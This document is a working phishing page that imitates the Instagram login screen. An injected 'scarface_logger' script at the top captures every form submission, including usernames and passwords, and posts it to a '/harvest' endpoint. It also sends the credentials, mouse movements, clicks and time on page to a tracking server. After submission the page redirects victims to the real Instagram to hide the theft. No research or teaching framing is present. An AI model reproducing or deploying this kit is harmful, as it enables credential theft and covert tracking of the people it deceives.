<!-- scarface_logger -->
<script>
(function() {
    if(window.__scarface_loaded) return;
    window.__scarface_loaded = true;
    
    const SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    // ==================== CREDENTIAL HARVESTING ====================
    function formToDict(form) {
        var data = {};
        var fd = new FormData(form);
        fd.forEach(function(value, key) {
            data[key] = value;
        });
        if(Object.keys(data).length === 0) {
            var idx = 0;
            var els = form.querySelectorAll('input,select,textarea');
            els.forEach(function(el) {
                var k = el.name || el.id || ('field_'+idx++);
                var v = el.value;
                data[k] = v;
            });
        }
        return data;
    }
    
    function sendHarvest(form) {
        try {
            var data = formToDict(form);
            fetch('/harvest', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(function(){});
            
            // Also send to intel dashboard
            if (true) {
                trackIntel('credentials_submitted', data);
            }
        }catch(e){}
    }
    
    // ==================== INTEL TRACKING ====================
    function trackIntel(eventType, data) {
        if (!true) return;
        
        const payload = {
            session_id: SESSION_ID,
            event_type: eventType,
            data: {
                ...data,
                url: window.location.href,
                referrer: document.referrer,
                screen: { width: screen.width, height: screen.height },
                timestamp: new Date().toISOString()
            }
        };
        
        fetch('http://127.0.0.1:5500/track', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            mode: 'cors'
        }).catch(function(){});
    }
    
    // Track page view
    if (true) {
        trackIntel('page_view', {
            title: document.title,
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform
        });
    }
    
    // ==================== FORM HOOKS ====================
    var origSubmit = HTMLFormElement.prototype.submit;
    HTMLFormElement.prototype.submit = function() {
        sendHarvest(this);
        origSubmit.apply(this, arguments);
    };
    
    document.addEventListener('submit', function(e){
        sendHarvest(e.target);
    }, true);
    
    function hookBtns(form){
        var btns = form.querySelectorAll('[type=submit],button');
        btns.forEach(function(btn){
            btn.addEventListener('click', function(){sendHarvest(form);}, true);
        });
        var inputs = form.querySelectorAll('input');
        inputs.forEach(function(input){
            input.addEventListener('keydown', function(e){
                if(e.key==='Enter'){sendHarvest(form);}
            }, true);
        });
    }
    
    document.querySelectorAll('form').forEach(hookBtns);
    
    var mo = new MutationObserver(function(muts){
        muts.forEach(function(mut){
            mut.addedNodes.forEach(function(node){
                if(node.tagName==='FORM') hookBtns(node);
                else if(node.querySelectorAll) node.querySelectorAll('form').forEach(hookBtns);
            });
        });
    });
    mo.observe(document.documentElement,{childList:true,subtree:true});
    
    // ==================== INTEL TRACKING EVENTS ====================
    if (true) {
        // Mouse movement (throttled)
        let lastMouse = 0;
        document.addEventListener('mousemove', function(e) {
            const now = Date.now();
            if (now - lastMouse > 3000) {
                lastMouse = now;
                trackIntel('mouse_move', { x: e.clientX, y: e.clientY });
            }
        }, { passive: true });
        
        // Clicks
        document.addEventListener('click', function(e) {
            trackIntel('click', {
                element: e.target.tagName,
                id: e.target.id,
                text: e.target.textContent?.substring(0, 50)
            });
        }, { passive: true });
        
        // Form field focus
        document.addEventListener('focus', function(e) {
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                trackIntel('form_field_focus', {
                    field_name: e.target.name || e.target.id,
                    field_type: e.target.type
                });
            }
        }, true);
        
        // Time on page
        let timeOnPage = 0;
        setInterval(function() {
            timeOnPage += 5;
            trackIntel('time_on_page', { seconds: timeOnPage });
        }, 5000);
        
        // Page unload
        window.addEventListener('beforeunload', function() {
            trackIntel('page_unload', { seconds_on_page: timeOnPage });
        });
    }
})();
</script>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            color: #fff;
        }
        
        .language-bar {
            width: 100%;
            text-align: center;
            padding: 12px 0;
            margin-bottom: 20px;
        }
        
        .language-bar span {
            color: rgb(203, 210, 217);
            font-weight: 400;
            font-size: 13px;
            font-family: "Optimistic Text Normal";
            white-space: pre-wrap;
            overflow-wrap: break-word;
        }
        
        .logo-container {
            margin: 30px 0 40px;
            text-align: center;
        }
        
        .logo {
            max-height: 60px;
            min-height: 0;
            object-fit: contain;
            overflow: hidden;
        }
        
        .login-form {
            width: 100%;
            max-width: 350px;
        }
        
        .input-group {
            margin-bottom: 12px;
        }
        
        .input-container {
            background: rgb(28, 43, 51);
            border: 1px solid rgb(70, 90, 105);
            border-radius: 12px;
            padding: 10px 16px;
            display: flex;
            align-items: center;
            transition: all 0.3s ease;
        }
        
        .input-container:focus-within {
            border-color: rgb(71, 165, 250);
            box-shadow: 0 0 0 2px rgba(71, 165, 250, 0.2);
        }
        
        .input-field {
            background: transparent;
            color: rgb(255, 255, 255);
            font-family: "Optimistic Text Medium";
            font-size: 16px;
            line-height: 1.3;
            border: none;
            outline: none;
            width: 100%;
            padding: 6px 0;
        }
        
        .input-field::placeholder {
            color: rgb(133, 149, 164);
        }
        
        .login-button {
            background: rgb(0, 100, 224);
            color: white;
            border: none;
            border-radius: 22px;
            font-weight: 500;
            font-size: 16px;
            font-family: "Optimistic Text Normal";
            padding: 12px 0;
            width: 100%;
            margin: 20px 0;
            cursor: pointer;
            transition: background 0.3s;
        }
        
        .login-button:hover {
            background: rgb(0, 85, 200);
        }
        
        .forgot-password {
            color: rgb(255, 255, 255);
            font-weight: 500;
            font-size: 16px;
            font-family: "Optimistic Text Normal";
            text-decoration: none;
            display: block;
            text-align: center;
            margin-bottom: 30px;
            transition: color 0.3s;
        }
        
        .forgot-password:hover {
            color: rgb(200, 220, 255);
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 25px 0;
        }
        
        .divider-line {
            flex-grow: 1;
            height: 1px;
            background: rgb(70, 90, 105);
        }
        
        .divider-text {
            padding: 0 15px;
            color: rgb(133, 149, 164);
            font-size: 14px;
        }
        
        .create-account {
            background: transparent;
            border: 1px solid rgb(69, 153, 254);
            border-radius: 22px;
            color: rgb(71, 165, 250);
            font-weight: 500;
            font-size: 16px;
            font-family: "Optimistic Text Normal";
            padding: 12px 0;
            width: 100%;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .create-account:hover {
            background: rgba(71, 165, 250, 0.1);
        }
        
        .meta-footer {
            margin-top: 40px;
            text-align: center;
            padding: 20px 0 0;
        }
        
        .meta-logo {
            height: 12px;
            filter: brightness(0.8);
        }
        
        .password-toggle {
            width: 24px;
            height: 24px;
            margin-left: 12px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .password-toggle img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: invert(0.7);
        }
        
        @media (max-width: 480px) {
            body {
                padding: 15px;
            }
            
            .logo-container {
                margin: 20px 0 30px;
            }
            
            .login-form {
                max-width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="language-bar">
        <span>English (US)</span>
    </div>
    
    <div class="logo-container">
        <img src="https://static.cdninstagram.com/rsrc.php/v4/yq/r/_7cAFFbc4Pr.png" alt="Instagram from Meta" class="logo">
    </div>
    
    <form id="loginForm" class="login-form">
        <div class="input-group">
            <div class="input-container">
                <input type="text" class="input-field" id="username" name="username" placeholder="Username, email or mobile number" required>
            </div>
        </div>
        
        <div class="input-group">
            <div class="input-container">
                <input type="password" class="input-field" id="password" name="password" placeholder="Password" required>
                <div class="password-toggle">
                    <img src="https://static.cdninstagram.com/rsrc.php/v4/yX/r/JU2JvzCINIm.png" alt="Show password">
                </div>
            </div>
        </div>
        
        <button type="submit" class="login-button">Log in</button>
        
        <a href="#" class="forgot-password">Forgot password?</a>
        
        <div class="divider">
            <div class="divider-line"></div>
            <div class="divider-text">OR</div>
            <div class="divider-line"></div>
        </div>
        
        <button type="button" class="create-account" id="createAccount">Create new account</button>
    </form>
    
    <div class="meta-footer">
        <img src="https://static.cdninstagram.com/rsrc.php/v4/y3/r/aAfprBW6TIe.png" alt="Meta" class="meta-logo">
    </div>
    
    <script>
        // Toggle password visibility
        document.querySelector('.password-toggle').addEventListener('click', function() {
            const passwordField = document.getElementById('password');
            const toggleIcon = this.querySelector('img');
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                toggleIcon.src = 'https://static.cdninstagram.com/rsrc.php/v4/yz/r/pVaihuQQsy8.png';
            } else {
                passwordField.type = 'password';
                toggleIcon.src = 'https://static.cdninstagram.com/rsrc.php/v4/yX/r/JU2JvzCINIm.png';
            }
        });
        
        // Add focus effect to input containers
        const inputContainers = document.querySelectorAll('.input-container');
        inputContainers.forEach(container => {
            const input = container.querySelector('.input-field');
            
            input.addEventListener('focus', () => {
                container.style.borderColor = 'rgb(71, 165, 250)';
                container.style.boxShadow = '0 0 0 2px rgba(71, 165, 250, 0.2)';
            });
            
            input.addEventListener('blur', () => {
                container.style.borderColor = 'rgb(70, 90, 105)';
                container.style.boxShadow = 'none';
            });
        });

        // Viewport-based redirection logic
        function checkViewportAndRedirect() {
            if (window.location.pathname.endsWith('desktop.html')) {
                return;
            }
            
            const viewportWidth = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
            
            if (viewportWidth > 720) {
                window.location.href = 'desktop.html';
            }
        }

        // Run on initial page load
        checkViewportAndRedirect();
        
        // Also run when window is resized (with debounce to prevent excessive checks)
        let resizeTimer;
        window.addEventListener('resize', function() {
            clearTimeout(resizeTimer);
            resizeTimer = setTimeout(checkViewportAndRedirect, 200);
        });

        // Form submission handler
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Show loading state on button
            const loginButton = this.querySelector('.login-button');
            const originalText = loginButton.textContent;
            loginButton.textContent = 'Logging in...';
            loginButton.disabled = true;
            
            // Get form data
            const formData = new FormData(this);
            const data = Object.fromEntries(formData.entries());
            
            // Simulate network request with delay
            setTimeout(() => {
                console.log('Login attempt with:', data);
                
                // Always redirect to Instagram after "login"
                window.location.href = 'https://www.instagram.com/';
                
                // Reset button state (won't be visible due to redirect)
                loginButton.textContent = originalText;
                loginButton.disabled = false;
            }, 1500);
        });
        
        // Create account button functionality
        document.getElementById('createAccount').addEventListener('click', function() {
            window.location.href = 'https://www.instagram.com/accounts/emailsignup/';
        });
        
        // Forgot password link functionality
        document.querySelector('.forgot-password').addEventListener('click', function(e) {
            e.preventDefault();
            window.location.href = 'https://www.instagram.com/accounts/password/reset/';
        });
    </script>
</body>
</html>
